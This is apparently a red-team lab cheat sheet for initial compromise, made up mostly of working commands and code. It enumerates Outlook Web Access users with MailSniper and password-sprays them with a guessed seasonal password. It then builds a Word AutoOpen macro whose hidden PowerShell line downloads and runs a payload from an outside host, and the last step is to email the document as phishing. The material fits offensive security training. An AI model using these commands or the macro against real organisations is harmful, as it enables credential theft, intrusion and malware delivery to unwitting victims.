# Initial Compromise

Enumerating Outlook Web Access (OWA) to identify valid user and conducting password spray attack

# Identify the mail server of given domain

    $ dig cyberbotic.io
    $ ./dnscan.py -d cyberbotic.io -w subdomains-100.txt

# Idenitfy the NETBIOS name of target domain

    ps> ipmo C:\Tools\MailSniper\MailSniper.ps1
    ps> Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io

# Extract Employee Names (FirstName LastName) and Prepare Username List

    $ ~/namemash.py names.txt > possible.txt

# Validate the username to find active/real usernames

    ps> Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt

# Conduct Password Spraying attack with known Password on identified users

    ps> Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022

# Use Identified credentials to download Global Address List

    ps> Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt

Create a malicious Office file having embedded macro

# Step 1: Open a blank word document "Document1". Navigate to  View > Macros > Create. Changes macros in to Document1. Name the default macro function as AutoOpen. Paste the below content and run for testing

    Sub AutoOpen()

      Dim Shell As Object
      Set Shell = CreateObject("wscript.shell")
      Shell.Run "notepad"

    End Sub

# Step 2: Generate a payload for web delivery (Attacks > Scripted Web Delivery (S) and generate a 64-bit PowerShell payload with your HTTP/DNS listener). Balance the number of quotes

    Sub AutoOpen()

      Dim Shell As Object
      Set Shell = CreateObject("wscript.shell")
	    Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""

    End Sub

# Step 3: Save the document as .doc file and send it as phising email
